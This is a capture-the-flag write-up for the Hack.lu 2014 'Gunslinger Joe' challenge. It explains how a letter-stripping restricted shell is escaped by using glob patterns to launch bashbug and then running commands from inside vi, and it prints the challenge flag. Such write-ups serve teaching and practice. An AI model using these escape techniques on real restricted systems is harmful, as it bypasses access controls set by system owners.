# Hack.lu CTF 2014: Gunslinger Joe’s private Terminal

**Category:** Misc
**Points:** 50
**Author:** cutz
**Description:**

> Gunslinger Joe has a pretty bad memory and always forgets the password for his private terminals! That’s why he always uses his username as password but also makes sure that absolutely no one else who knows his name can interact with his secure terminal. Wouldn't it be super embarrassing for him to prove him wrong?
>
> SSH: gunslinger_joe@wildwildweb.fluxfingers.net
> PORT: 1403

## Write-up

Let’s connect to the SSH server using `gunslinger_joe` as both the username and password, as stated in the challenge description:

```bash
$ ssh -p 1403 gunslinger_joe@wildwildweb.fluxfingers.net
gunslinger_joe@wildwildweb.fluxfingers.net's password:

           ,'-',
          :-----:
      (''' , - , ''')
      \   ' .  , `  /
       \  '   ^  ? /
        \ `   -  ,'
         `j_ _,'       Gunslinger Joe's
    ,- -`\ \  /f        Private Terminal
  ,-      \_\/_/'-
 ,                 `,
 ,          Joe      ,
      /\          \
|    /             \   ',
,   f  :           :`,  ,
<...\  ,           : ,- '
\,,,,\ ;           : j  '
 \    \            :/^^^^'
  \    \            ; ''':
    \   -,         -`.../
     '    - -,`,--`
      \_._'-- '---:

$ id
$ ls
$ ls -lsa
: -: command not found
```

So we indeed have access to a shell, but something strange is going on… It seems like some characters are being filtered.

Entering `-` reveals that our input is passed as an argument to `bash`:

```bash
$ -
: -
: invalid option
Usage:  bash [GNU long option] [option] ...
  bash [GNU long option] [option] script-file ...
GNU long options:
  --debug
  --debugger
  --dump-po-strings
  --dump-strings
  --help
  --init-file
  --login
  --noediting
  --noprofile
  --norc
  --posix
  --rcfile
  --restricted
  --verbose
  --version
Shell options:
  -ilrsD or -c command or -O shopt_option   (invocation only)
  -abefhkmnptuvxBCHP or -o option
```

Realizing that causing a syntax error results in a helpful error message, I entered all printable ASCII characters to see which ones would be removed:

```
$ () { :;} `() { :;}  !"#$%&\'()*+,-./0123456789:;<=>?@[\\]^_`{|}~'
: -c: line 0: syntax error near unexpected token `)'
: -c: line 0: `() { :;} `() { :;}  !"#$%&\'()*+,-./0123456789:;<=>?@[\\]^_`{|}~''
```

So yeah, all alphabetic characters are removed from the input. Entering `*` reveals that there’s a file named `FLAG` in the current working directory:

```bash
$ *
: ./FLAG: Permission denied
```

Let’s check the root directory:

```bash
$ /*
: /bin: Is a directory
```

Hmm, what would the first item in `/bin/*` be?

```bash
$ /*/*
```

Yay! `/*/*` expands to `/bin/bashbug`, which causes `$EDITOR` — in this case, `vi` — to open. From within `vi` we can easily run arbitrary commands:

```
:!id
uid=1000(gunslinger_joe) gid=1000(gunslinger_joe) groups=1000(gunslinger_joe)

:!cat FLAG
flag{joe_thought_youd_suck_at_bash}
```

The flag is `flag{joe_thought_youd_suck_at_bash}`.

## Other write-ups and resources

* none yet
